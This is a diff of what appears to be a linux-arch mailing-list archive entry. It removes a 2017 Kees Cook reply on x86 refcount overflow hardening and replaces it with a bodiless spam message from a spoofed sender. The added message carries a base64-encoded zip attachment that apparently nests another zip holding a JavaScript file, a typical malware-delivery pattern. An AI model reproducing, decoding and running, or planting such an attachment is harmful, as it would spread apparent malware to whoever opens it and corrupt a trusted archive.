@@ -1,48 +1,47 @@
-From: Kees Cook <keescook@chromium.org>
-Subject: Re: [PATCH] x86/refcount: Implement fast refcount_t handling
-Date: Tue, 25 Apr 2017 09:39:52 -0700
-Message-ID: <CAGXu5jJF0g7Yw+2PDw_woyv0GsCOrX61noMu00p-hSO4Thi65Q@mail.gmail.com>
-References: <20170421220939.GA65363@beast> <58FDDAC2.11341.175B5A99@pageexec.freemail.hu>
- <CAGXu5jLDybHn_K=vpXOhrsBE_-EtPA+jbXCqHmm3tUgbK24BOw@mail.gmail.com> <58FF3273.8060.1C99E526@pageexec.freemail.hu>
+From: <christine_pomeranz@fitnyc.edu>
+Subject: 12074 linux-arch
+Date: Tue, 25 Apr 2017 18:23:58 -0000
+Message-ID: <149314463838.17249.13805707035935690821@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="9460094777553.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-arch-owner@vger.kernel.org>
-Received: from mail-io0-f169.google.com ([209.85.223.169]:32798 "EHLO
-        mail-io0-f169.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1432010AbdDYQjy (ORCPT
-        <rfc822;linux-arch@vger.kernel.org>); Tue, 25 Apr 2017 12:39:54 -0400
-Received: by mail-io0-f169.google.com with SMTP id k87so220619901ioi.0
-        for <linux-arch@vger.kernel.org>; Tue, 25 Apr 2017 09:39:54 -0700 (PDT)
-In-Reply-To: <58FF3273.8060.1C99E526@pageexec.freemail.hu>
+Received: from static.vnpt.vn ([14.228.130.149]:38676 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1952699AbdDYSYP (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Tue, 25 Apr 2017 14:24:15 -0400
+Content-Disposition: attachment
 Sender: linux-arch-owner@vger.kernel.org
 List-ID: <linux-arch.vger.kernel.org>
-To: PaX Team <pageexec@freemail.hu>
-Cc: Peter Zijlstra <peterz@infradead.org>, LKML <linux-kernel@vger.kernel.org>, Eric Biggers <ebiggers3@gmail.com>, Christoph Hellwig <hch@infradead.org>, "axboe@kernel.dk" <axboe@kernel.dk>, James Bottomley <James.Bottomley@hansenpartnership.com>, Elena Reshetova <elena.reshetova@intel.com>, Hans Liljestrand <ishkamiel@gmail.com>, David Windsor <dwindsor@gmail.com>, "x86@kernel.org" <x86@kernel.org>, Ingo Molnar <mingo@kernel.org>, Arnd Bergmann <arnd@arndb.de>, Greg Kroah-Hartman <gregkh@linuxfoundation.org>, Jann Horn <jann@thejh.net>, "David S. Miller" <davem@davemloft.net>, linux-arch <linux-arch@vger.kernel.org>, "kernel-hardening@lists.openwall.com" <kernel-hardening@lists.openwall.com>
+To: linux-arch@vger.kernel.org
 
-On Tue, Apr 25, 2017 at 4:26 AM, PaX Team <pageexec@freemail.hu> wrote:
-> INT_MAX threads would be needed when the leaking path is locked so
-> that it can only be exercised once and you'll need to get normal
-> (balanced) paths preempted just after the increment. if the leaking
-> path is lockless (can be exercised in parallel without bounds) then
-> 2 threads are enough where the one triggering the signed overflow
-> would have to be preempted while the other one does INT_MAX increments
-> and trigger the UAF. this is where the other mechanisms i talked about
-> in the past become relevant: preemption or interrupts can be disabled
-> or negative refcount values can be detected and acted upon (your blind
-> copy-pasting effort passed upon this latter opportunity by not
-> specializing the 'jo' into 'js' for the refcount case).
-
-Well, it's not "blind" -- I'm trying to bring the code as-is to
-upstream for discussion/examination with as little functional
-differences as possible so it's easier to compare apples to apples.
-(Which already resulted in more eyes looking at the code to find a bug
--- thanks Jann!) But yes, jo -> js hugely increases the coverage. I'll
-make that change for v2.
-
-Thanks!
-
--Kees
-
--- 
-Kees Cook
-Pixel Security
+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
